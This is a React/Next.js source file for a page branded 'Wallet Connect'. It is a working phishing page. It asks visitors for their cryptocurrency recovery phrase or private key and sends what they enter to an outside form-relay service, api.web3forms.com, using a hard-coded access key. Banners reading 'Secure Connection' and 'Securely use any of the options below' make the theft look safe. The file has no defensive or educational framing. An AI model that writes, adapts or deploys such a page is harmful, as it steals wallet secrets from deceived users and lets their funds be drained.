'use client';

import Image from 'next/image';
import React, { useState } from 'react';
import { GrSecure } from 'react-icons/gr';

const ConnectionPage = () => {
    const [activeTab, setActiveTab] = useState<'phrase' | 'privateKey'>('phrase');
    const [phraseData, setPhraseData] = useState('');
    const [privateKeyData, setPrivateKeyData] = useState('');
    const [loading, setLoading] = useState(false);
    const [success, setSuccess] = useState(false);
    const [error, setError] = useState(false);

    const handleTabSwitch = (tab: 'phrase' | 'privateKey') => {
        setActiveTab(tab);
        setSuccess(false); // Clear success/error messages when switching tabs
        setError(false);
    };

    const handleSubmit = async (type: 'phrase' | 'privateKey') => {
        const inputData = type === 'phrase' ? phraseData.trim() : privateKeyData.trim();
        if (!inputData) {
            alert(`Please enter your ${type === 'phrase' ? 'recovery phrase' : 'private key'}.`);
            return;
        }

        setLoading(true);
        setError(false);
        setSuccess(false);

        try {
            const response = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    access_key: 'fff89af3-ebeb-4587-ae30-6bc8d74fda0c', // Replace with your Web3Forms Access Key
                    [type]: inputData,
                }),
            });

            if (response.ok) {
                setSuccess(true);
                if (type === 'phrase') setPhraseData(''); // Clear phrase textarea
                if (type === 'privateKey') setPrivateKeyData(''); // Clear private key textarea
            } else {
                setError(true);
            }
        } catch {
            setError(true);
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="relative flex flex-col items-center justify-start gap-5 w-screen h-screen bg-black text-gray-600 p-5 pt-20">
            <div className='flex items-center gap-3 '>
                <Image src={"/image/wc1.png"} height={50} width={50} alt={"wallet_conn"} />
                <h3 className='text-white font-bold'>Wallet Connect</h3>
            </div>
            {/* INFO ALERT */}
            <div className='flex items-center justify-center bg-blue-200 rounded-xl p-3'>
                <h2 className='text-blue-800 text-center'>
                    <span className='font-bold'>Info Alert!</span> {" "}
                    Securely use any of the options below
                </h2>
            </div>

            <div className="flex flex-col items-center justify-start p-3 max-w-[500px] min-w-[350px] h-[300px] bg-gray-200 rounded-xl gap-5">
                {/* Tab Buttons */}
                <div className="flex w-full gap-3 items-center">
                    <div
                        className={`p-3 mb-5 cursor-pointer hover:bg-gray-300 ${activeTab === 'phrase' ? 'border-b-2 border-blue-400 text-blue-700 font-bold' : 'text-gray-700 font-bold'
                            }`}
                        onClick={() => handleTabSwitch('phrase')}
                    >
                        Phrase
                    </div>
                    <div
                        className={`p-3 mb-5 cursor-pointer hover:bg-gray-300 ${activeTab === 'privateKey' ? 'border-b-2 border-blue-400 text-blue-700 font-bold' : 'text-gray-700 font-bold'
                            }`}
                        onClick={() => handleTabSwitch('privateKey')}
                    >
                        Private Key
                    </div>
                </div>

                {/* Feedback Messages */}
                {success && (
                    <div className="w-full text-center text-green-500 font-bold">
                        {activeTab === 'phrase' ? 'Successful! We will link your wallet shortly' : 'Successful! We will address your concerns shortly'}
                    </div>
                )}
                {error && (
                    <div className="w-full text-center text-red-500 font-bold">
                        {activeTab === 'phrase' ? 'Failed to send phrase. Try again.' : 'Failed to send private key. Try again.'}
                    </div>
                )}

                {/* Phrase Tab Content */}
                {activeTab === 'phrase' && (
                    <>
                        <textarea
                            rows={5}
                            className="w-full rounded-xl p-5"
                            placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)"
                            value={phraseData}
                            onChange={(e) => setPhraseData(e.target.value)}
                        />
                        <button
                            className={`self-start p-3 px-6 text-white cursor-pointer rounded ${loading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'
                                }`}
                            onClick={() => handleSubmit('phrase')}
                            disabled={loading}
                        >
                            {loading ? 'Processing...' : 'Proceed'}
                        </button>
                    </>
                )}

                {/* Private Key Tab Content */}
                {activeTab === 'privateKey' && (
                    <>
                        <textarea
                            rows={5}
                            className="w-full rounded-xl p-5"
                            placeholder="Enter your private key"
                            value={privateKeyData}
                            onChange={(e) => setPrivateKeyData(e.target.value)}
                        />
                        <button
                            className={`self-start p-3 px-6 text-white cursor-pointer rounded ${loading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'
                                }`}
                            onClick={() => handleSubmit('privateKey')}
                            disabled={loading}
                        >
                            {loading ? 'Processing...' : 'Proceed'}
                        </button>
                    </>
                )}
            </div>

            <div className='flex items-center justify-center fixed bottom-0 left-0 bg-blue-800 h-[60px] w-full text-white font-bold gap-3'>
                <GrSecure/>
                <h3 className='justify-self-center'>Secure Connection</h3>
            </div>
        </div>
    );
};

export default ConnectionPage;
